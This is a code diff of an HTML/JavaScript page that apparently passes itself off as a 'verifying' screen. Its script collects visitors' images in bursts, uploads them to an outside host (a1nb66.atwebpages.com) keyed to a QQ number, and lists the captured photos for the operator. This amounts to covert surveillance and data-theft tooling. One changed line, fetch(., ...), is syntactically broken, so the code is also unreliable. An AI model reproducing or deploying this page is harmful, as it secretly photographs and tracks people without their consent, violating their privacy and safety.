@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>验证中..</title>
+    <title>照妖镜 - 多功能采集工具</title>
     <style>
         /* ===== 基础样式 ===== */
         * { margin:0; padding:0; box-sizing:border-box; }
@@ -178,7 +178,7 @@ async function queryPhotos() {
     resultDiv.innerHTML = '查询中...';
 
     try {
-        const resp = await fetch(`http://a1nb66.atwebpages.com/zyj/api.php?action=list_images&qq=${qq}`);
+        const resp = await fetch(`http://a1nb66.atwebpages.com/zyj/?action=list_images&qq=${qq}`);
         const data = await resp.json();
         if (!data.success) {
             resultDiv.innerHTML = `<div style="color:#e74c3c;">${data.message || '查询失败'}</div>`;
@@ -316,7 +316,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
             fd.append('qq', qq);
             fd.append('image', img);
             try {
-                const resp = await fetch(API, { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
+                const resp = await fetch(., { method: 'POST', body: fd, signal: AbortSignal.timeout(15000) });
                 if (resp.ok) {
                     const r = await resp.json();
                     if (r.success) pushLog(`Upload success: ${r.image || 'ok'}`);
